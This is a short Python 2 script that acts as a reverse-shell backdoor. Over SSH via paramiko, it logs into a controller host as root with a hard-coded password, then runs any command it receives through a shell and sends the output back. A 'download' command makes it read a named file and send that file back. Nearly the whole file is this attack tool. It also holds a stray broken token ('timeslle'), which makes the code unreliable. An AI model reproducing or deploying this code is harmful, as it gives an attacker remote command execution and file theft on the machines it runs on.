import paramiko
import threading
import os
import subprocess
import time
import sys

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('127.0.0.1', username='root', password='toor')
s = client.get_transport().open_session()
success ='Success! We made it!EOFEOFEOFEOFEOFX'
s.send(success)


while True:
	# this data is now encrypted
	data = s.recv(1024)
	print data
	
	# check for quit
	if data.startswith("quit") == True:
		sendData = 'Exit. \n EOFEOFEOFEOFEOFX'
		sys.exit()
    
	elif data.startswith("download") == True:
		sendFile = data[9:]
		
		f = open(sendFile, 'rb')
		while 1:
		    fileData = f.read()
		    if fileData == '': break
		    s.sendall(fileData)
		f.close()
		timeslle

	else:
		# execute command
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		# save output/error
		stdoutput = proc.stdout.read() + proc.stderr.read() + 'EOFEOFEOFEOFEOFX'
	
		# send encrypted output
		s.send(stdoutput)
    
# loop ends here
s.close()
